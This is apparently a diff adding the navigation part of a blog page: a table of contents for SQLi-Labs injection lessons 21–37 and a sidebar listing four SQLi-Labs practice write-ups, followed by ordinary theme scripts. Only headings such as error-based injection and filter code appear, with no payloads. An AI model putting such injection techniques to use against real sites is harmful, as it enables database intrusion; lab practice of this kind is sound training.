+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-21"><span class="toc-number">1.</span> <span class="toc-text">Lesson 21</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-22"><span class="toc-number">2.</span> <span class="toc-text">Lesson 22</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-23"><span class="toc-number">3.</span> <span class="toc-text">Lesson 23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-24"><span class="toc-number">4.</span> <span class="toc-text">Lesson 24</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-25"><span class="toc-number">5.</span> <span class="toc-text">Lesson 25</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-25a"><span class="toc-number">6.</span> <span class="toc-text">Lesson 25a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-26"><span class="toc-number">7.</span> <span class="toc-text">Lesson 26</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%E5%90%8D%EF%BC%9A"><span class="toc-number">7.1.1.</span> <span class="toc-text">库名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D%EF%BC%9A"><span class="toc-number">7.1.2.</span> <span class="toc-text">表名：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-26a"><span class="toc-number">8.</span> <span class="toc-text">Lesson 26a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-27"><span class="toc-number">9.</span> <span class="toc-text">Lesson 27</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81"><span class="toc-number">9.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-27a"><span class="toc-number">10.</span> <span class="toc-text">Lesson 27a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-28"><span class="toc-number">11.</span> <span class="toc-text">Lesson 28</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81-1"><span class="toc-number">11.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-28a"><span class="toc-number">12.</span> <span class="toc-text">Lesson 28a</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81-2"><span class="toc-number">12.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-29"><span class="toc-number">13.</span> <span class="toc-text">Lesson 29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-30-31"><span class="toc-number">14.</span> <span class="toc-text">Lesson 30~31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-32"><span class="toc-number">15.</span> <span class="toc-text">Lesson 32</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-33"><span class="toc-number">16.</span> <span class="toc-text">Lesson 33</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-34"><span class="toc-number">17.</span> <span class="toc-text">Lesson 34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-35"><span class="toc-number">18.</span> <span class="toc-text">Lesson 35</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-36"><span class="toc-number">19.</span> <span class="toc-text">Lesson 36</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-real-escape-string-%E5%87%BD%E6%95%B0"><span class="toc-number">19.1.</span> <span class="toc-text">mysql-real-escape-string()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">19.1.1.</span> <span class="toc-text">语法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-37"><span class="toc-number">20.</span> <span class="toc-text">Lesson 37</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span>
+            <a class="archive-post-title" href="/2022/11/21/SQLi-Labs%20Stacked%20Injection/">SQLi-Labs靶场刷题记录【Stacked Challenges】</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span>
+            <a class="archive-post-title" href="/2022/11/21/SQLi-Labs%20Adv%20Challenges/">SQLi-Labs靶场刷题记录【Adv Challenges】</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span>
+            <a class="archive-post-title" href="/2022/11/21/SQLi-Labs%20%20Challenges/">SQLi-Labs靶场刷题记录【Challenges】</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2022/11/10/SQLi-Labs%20Basic%20Challenges/">SQLi-Labs靶场刷题记录【Basic Challenges】</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://r4x.top",
+        root: siteMetaRoot,
+        author: "R4x"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
